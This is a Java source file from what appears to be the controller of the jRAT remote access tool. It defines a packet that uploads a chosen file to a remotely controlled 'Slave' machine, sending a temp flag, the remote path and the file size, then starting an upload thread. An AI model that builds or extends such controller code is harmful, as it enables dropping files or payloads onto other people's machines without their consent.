package io.jrat.controller.packets.outgoing;

import io.jrat.controller.Slave;
import io.jrat.controller.threads.UploadThread;

import java.io.DataOutputStream;
import java.io.File;

public class Packet42ServerUploadFile extends AbstractOutgoingPacket {

	protected File file;
	protected String remoteFile;
	protected boolean temp;
	protected UploadThread thread;

	public Packet42ServerUploadFile(File file, String remoteFile) {
		this(file, remoteFile, false);
	}
	
	public Packet42ServerUploadFile(File file, String remoteFile, boolean temp) {
		this.file = file;
		this.remoteFile = remoteFile;
		this.temp = temp;
		this.thread = new UploadThread(null, remoteFile, file);
	}
	
	public Packet42ServerUploadFile(File file, String remoteFile, boolean temp, UploadThread thread) {
		this.file = file;
		this.remoteFile = remoteFile;
		this.temp = temp;
		this.thread = thread;
	}
	
	@Override
	public void write(final Slave slave, DataOutputStream dos) throws Exception {
		dos.writeBoolean(temp);
		slave.writeLine(remoteFile);
		dos.writeLong(file.length());

		if (file.exists() && file.isFile()) {
			thread.setSlave(slave);
			thread.getData().setObject(slave);
			thread.getData().start();
		}
	}

	@Override
	public short getPacketId() {
		return 42;
	}

}
